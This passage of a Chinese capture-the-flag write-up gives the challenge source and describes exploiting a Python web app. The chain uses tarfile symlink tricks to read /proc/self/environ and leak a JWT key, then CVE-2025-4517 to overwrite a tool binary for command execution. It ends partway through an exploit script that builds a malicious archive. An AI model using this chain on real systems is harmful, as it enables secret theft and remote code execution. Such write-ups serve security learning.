class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> importlib <span class="keyword">import</span> reload</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> environ</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> NamedTemporaryFile, TemporaryDirectory</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid4</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> pigsay</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">from</span> litestar <span class="keyword">import</span> Litestar, get, post</span><br><span class="line"><span class="keyword">from</span> litestar.datastructures <span class="keyword">import</span> UploadFile</span><br><span class="line"><span class="keyword">from</span> litestar.params <span class="keyword">import</span> Body</span><br><span class="line"><span class="keyword">from</span> litestar.static_files <span class="keyword">import</span> create_static_files_router</span><br><span class="line"></span><br><span class="line">JWT_KEY = environ.pop(<span class="string">&quot;JWT_KEY&quot;</span>).encode()</span><br><span class="line">PIG_KEY = environ.pop(<span class="string">&quot;PIG_KEY&quot;</span>).encode()</span><br><span class="line">converter = pigsay.PigConverter(PIG_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@get(<span class="params"><span class="string">&quot;/api/ping&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ping</span>() -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Ping? Pong!</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;pong&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/encrypt&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Encrypt some text to pigsay text.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = converter.encrypt_string(<span class="built_in">str</span>(data[<span class="string">&quot;text&quot;</span>]))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;encrypt success&quot;</span>, <span class="string">&quot;data&quot;</span>: ret&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;encrypt error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/decrypt&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Decrypt some pigsay text.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = converter.decrypt_string(<span class="built_in">str</span>(data[<span class="string">&quot;text&quot;</span>]))</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;decrypt success&quot;</span>, <span class="string">&quot;data&quot;</span>: ret&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;decrypt error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_file_type</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    allows = [<span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>, <span class="string">&quot;.tar.gz&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>([filename.endswith(allow) <span class="keyword">for</span> allow <span class="keyword">in</span> allows])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uncompress_file</span>(<span class="params">filepath: <span class="built_in">str</span>, handler: <span class="built_in">callable</span></span>):</span><br><span class="line">    file = Path(filepath)</span><br><span class="line">    suffix = <span class="string">&quot;&quot;</span>.join(file.suffixes)</span><br><span class="line">    <span class="keyword">with</span> TemporaryDirectory(uuid4().<span class="built_in">hex</span>) <span class="keyword">as</span> tmp_dir:</span><br><span class="line">        tmp_dir = Path(tmp_dir)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            args = (filepath, <span class="built_in">str</span>(tmp_dir.absolute()))</span><br><span class="line">            <span class="keyword">match</span> suffix:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.zip&quot;</span>:</span><br><span class="line">                    unzip_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.rar&quot;</span>:</span><br><span class="line">                    unrar_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.7z&quot;</span>:</span><br><span class="line">                    un7z_file(*args)</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;.tar.gz&quot;</span>:</span><br><span class="line">                    untar_file(*args)</span><br><span class="line">                <span class="keyword">case</span> _:</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">f&quot;Unsupported file type: <span class="subst">&#123;suffix&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&quot;code&quot;</span>: <span class="number">20000</span>,</span><br><span class="line">                <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">                <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                    item.name: handler(item.read_text())</span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> tmp_dir.glob(<span class="string">&quot;*.txt&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;Uncompress file error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unzip_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(filepath) <span class="keyword">as</span> zf:</span><br><span class="line">        zf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unrar_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> rarfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> rarfile.RarFile(filepath) <span class="keyword">as</span> rf:</span><br><span class="line">        rf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">un7z_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> py7zr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> py7zr.SevenZipFile(filepath) <span class="keyword">as</span> sf:</span><br><span class="line">        sf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untar_file</span>(<span class="params">filepath: <span class="built_in">str</span>, extract_to_filepath: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(filepath, <span class="string">&quot;r:gz&quot;</span>) <span class="keyword">as</span> tf:</span><br><span class="line">        tf.extractall(extract_to_filepath)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/file/encrypt&quot;</span>, request_max_body_size=<span class="number">1024</span> * <span class="number">1024</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params"></span></span><br><span class="line"><span class="params">    data: UploadFile = Body(<span class="params">media_type=<span class="string">&quot;multipart/form-data&quot;</span></span>),</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    We can encrypt some txt file in a compressed file</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    filename = data.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_file_type(filename):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid file type&quot;</span>&#125;</span><br><span class="line">    content = <span class="keyword">await</span> data.read()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> NamedTemporaryFile(mode=<span class="string">&quot;wb&quot;</span>, suffix=filename) <span class="keyword">as</span> tmp:</span><br><span class="line">            tmp.write(content)</span><br><span class="line">            tmp.seek(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> uncompress_file(tmp.name, converter.encrypt_string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;Encrypt file error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">&quot;/api/file/decrypt&quot;</span>, request_max_body_size=<span class="number">1024</span> * <span class="number">1024</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params"></span></span><br><span class="line"><span class="params">    data: UploadFile = Body(<span class="params">media_type=<span class="string">&quot;multipart/form-data&quot;</span></span>),</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    We can decrypt some txt file in a compressed file</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    filename = data.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_file_type(filename):</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid file type&quot;</span>&#125;</span><br><span class="line">    content = <span class="keyword">await</span> data.read()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> NamedTemporaryFile(mode=<span class="string">&quot;wb&quot;</span>, suffix=filename) <span class="keyword">as</span> tmp:</span><br><span class="line">            tmp.write(content)</span><br><span class="line">            tmp.seek(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> uncompress_file(tmp.name, converter.decrypt_string)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">f&quot;Encrypt file error: <span class="subst">&#123;e&#125;</span>&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@post(<span class="params"><span class="string">f&quot;/api/admin/upgrade/<span class="subst">&#123;uuid4().<span class="built_in">hex</span>&#125;</span>&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">headers: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Only admin can do!</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    token = headers.get(<span class="string">&quot;r3-token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40300</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Authentication Failed&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> jwt.decode(token, JWT_KEY, algorithms=[<span class="string">&quot;HS256&quot;</span>]).get(<span class="string">&quot;role&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40300</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">40300</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Authentication Error&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = (</span><br><span class="line">            check_output(</span><br><span class="line">                [<span class="string">&quot;/app/upgrade.sh&quot;</span>],</span><br><span class="line">                env=<span class="literal">None</span>,</span><br><span class="line">                universal_newlines=<span class="literal">True</span>,</span><br><span class="line">                timeout=<span class="number">60</span>,</span><br><span class="line">                user=<span class="string">&quot;r3ctf&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">            .strip()</span><br><span class="line">            .replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;, &quot;</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        reload(pigsay)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> converter</span><br><span class="line">        converter = pigsay.PigConverter(PIG_KEY)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">20000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Upgrade successfully&quot;</span>, <span class="string">&quot;data&quot;</span>: ret&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;code&quot;</span>: <span class="number">50000</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Upgrade failed&quot;</span>, <span class="string">&quot;data&quot;</span>: <span class="built_in">str</span>(e)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Litestar(</span><br><span class="line">    route_handlers=[</span><br><span class="line">        ping,</span><br><span class="line">        encrypt,</span><br><span class="line">        decrypt,</span><br><span class="line">        encrypt_file,</span><br><span class="line">        decrypt_file,</span><br><span class="line">        upgrade,</span><br><span class="line">        create_static_files_router(path=<span class="string">&quot;/static&quot;</span>, directories=[<span class="string">&quot;static&quot;</span>]),</span><br><span class="line">        create_static_files_router(path=<span class="string">&quot;/&quot;</span>, directories=[<span class="string">&quot;public&quot;</span>], html_mode=<span class="literal">True</span>),</span><br><span class="line">    ],</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">uvicorn.run(app, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>upgrade.sh</p>
<p>关键的利用脚本，这个脚本在 Dockerfile 中被设置了不可写，只能读和执行，目的是防止这个脚本被覆盖从而任意命令执行了，得让选手再找一个可以写的文件进行利用。</p>
<p>整个脚本只是用了 uv 和 uvx ，这两个文件也都是不可写的，所以可以 strace 看看 uv add 和 uvx pigsay 到底执行了什么。</p>
<p>预期的解法就是 uvx pigsay 执行的时候，其实是执行 &#x2F;home&#x2F;r3ctf&#x2F;.local&#x2F;share&#x2F;uv&#x2F;tools&#x2F;pigsay&#x2F;bin&#x2F;pigsay 这个文件，而这个文件是可以写入的，所以覆盖这个文件后，调用 uvx pigsay … 就会执行覆盖后的命令。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /app</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> uv add -U pigsay &amp;&amp; uv tool upgrade pigsay; <span class="keyword">then</span></span><br><span class="line">    uvx pigsay encrypt <span class="string">&quot;[<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>] Upgrade Success!&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    uvx pigsay encrypt <span class="string">&quot;[<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>] Upgrade failed!&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>start.sh</p>
<p>这个启动文件没啥好说的，主要是适配平台的环境变量和做一些权限控制。以及设置随机 flag文件名 和 JWT_KEY。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /app/flag_$(python -c <span class="string">&#x27;import uuid; print(uuid.uuid4().hex)&#x27;</span>) &amp;&amp; \</span><br><span class="line"><span class="built_in">chmod</span> 744 /app/flag_*</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> FLAG</span><br><span class="line"><span class="built_in">export</span> FLAG=R3CTF&#123;fake_flag&#125;</span><br><span class="line">FLAG=R3CTF&#123;fake_flag&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$0</span></span><br><span class="line"></span><br><span class="line">su -s /bin/sh r3ctf -c \</span><br><span class="line"><span class="string">&#x27;JWT_KEY=$(python -c &quot;import uuid; print(uuid.uuid4().hex)&quot;) PIG_KEY=$(python -c &quot;import uuid; print(uuid.uuid4().hex)&quot;) uv run app.py&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Dockerfile</p>
<p>除了 uv 相关的操作，其他都是 root 用户执行的，避免一些非预期。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FROM python:3.14.0b2-alpine3.21</span><br><span class="line"></span><br><span class="line">COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/</span><br><span class="line"></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line">RUN apk add --no-cache gcc musl-dev linux-headers</span><br><span class="line">RUN addgroup -S r3ctf &amp;&amp; \</span><br><span class="line">    adduser -S r3ctf -G r3ctf -s /bin/sh &amp;&amp; \</span><br><span class="line">    chown r3ctf:r3ctf /app</span><br><span class="line"></span><br><span class="line">COPY start.sh /start.sh</span><br><span class="line">COPY app.py /app/</span><br><span class="line">COPY upgrade.sh /app/</span><br><span class="line">COPY pyproject.toml /app/</span><br><span class="line">COPY public /app/public/</span><br><span class="line">COPY static /app/static/</span><br><span class="line"></span><br><span class="line">RUN chmod 755 /start.sh &amp;&amp; \</span><br><span class="line">    chmod 744 /app/app.py &amp;&amp; \</span><br><span class="line">    chmod 755 /app/upgrade.sh</span><br><span class="line"></span><br><span class="line">USER r3ctf</span><br><span class="line">RUN uv tool install pigsay &amp;&amp; uv sync</span><br><span class="line"></span><br><span class="line">USER root</span><br><span class="line">ENTRYPOINT [&quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure>

<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>其实如果 get 到了 Dockerfile 中的 JWT_KEY 环境变量，就知道肯定要读 &#x2F;proc&#x2F;self&#x2F;environ （或者执行 env），结合 tarfile 的任意文件读，显然是前者，软连接的方式很轻松就可以获取 JWT_KEY。</p>
<p>随后配合 &#x2F;schema 泄漏的路径，就可以调用 upgrade 函数了。</p>
<p>最关键的一点，一旦知道了 CVE-2025-4517 能够写文件，那么就可以覆盖 &#x2F;home&#x2F;r3ctf&#x2F;.local&#x2F;share&#x2F;uv&#x2F;tools&#x2F;pigsay&#x2F;bin&#x2F;pigsay 从而执行任意命令了。</p>
<p>最后的 exp.py 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> traceback <span class="keyword">import</span> print_exc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8000&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://s1.r3.ret.sh.cn:32497&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc: <span class="built_in">str</span></span>):</span><br><span class="line">    req = requests.post(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/api/decrypt&quot;</span>,</span><br><span class="line">        json=&#123;</span><br><span class="line">            <span class="string">&quot;text&quot;</span>: enc,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line">    resp = req.json()</span><br><span class="line">    <span class="keyword">return</span> resp[<span class="string">&quot;data&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&quot;./read.tar.gz&quot;</span>, <span class="string">&quot;w:gz&quot;</span>) <span class="keyword">as</span> tar:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">addmemb</span>(<span class="params">name, **kwargs</span>):</span><br><span class="line">                memb = tarfile.TarInfo(name)</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items():</span><br><span class="line">                    <span class="built_in">getattr</span>(memb, k)</span><br><span class="line">                    <span class="built_in">setattr</span>(memb, k, v)</span><br><span class="line">                tar.addfile(memb)</span><br><span class="line"></span><br><span class="line">            addmemb(<span class="string">&quot;a/&quot;</span>, <span class="built_in">type</span>=tarfile.SYMTYPE, linkname=<span class="string">&quot;../&quot;</span>)</span><br><span class="line">            addmemb(<span class="string">&quot;b/&quot;</span>, <span 